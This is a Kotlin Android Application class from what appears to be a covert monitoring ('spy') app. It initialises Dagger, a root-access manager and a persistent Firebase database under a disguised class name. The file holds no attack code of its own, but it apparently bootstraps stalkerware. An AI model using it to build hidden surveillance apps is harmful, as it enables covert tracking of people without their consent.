package com.mine.spy.app

import android.app.Application
import androidx.multidex.MultiDex
import com.chrisplus.rootmanager.RootManager
import com.google.firebase.FirebaseApp
import com.google.firebase.database.FirebaseDatabase
import com.mine.spy.data.preference.DataSharePreference
import com.mine.spy.di.component.AppComponent
import com.mine.spy.di.component.DaggerAppComponent
import com.mine.spy.di.module.AppModule
import com.mine.spy.di.module.FirebaseModule
import com.mine.spy.utils.Consts.SIZE_CACHE_FIREBASE

class DummyNameForApp : Application() {

    companion object {
        @JvmStatic
        lateinit var appComponent: AppComponent

        @JvmStatic
        lateinit var root: RootManager
    }

    override fun onCreate() {
        super.onCreate()
        DataSharePreference.init(this)
        MultiDex.install(this)
        appComponent = DaggerAppComponent.builder()
            .appModule(AppModule(this))
            .firebaseModule(FirebaseModule())
            .build()
        appComponent.inject(this)
        root = RootManager.getInstance()
        if (FirebaseApp.getApps(this).isNotEmpty()) {
            val database = FirebaseDatabase.getInstance()
            database.setPersistenceEnabled(true)
            database.setPersistenceCacheSizeBytes(SIZE_CACHE_FIREBASE)
        }
    }
}
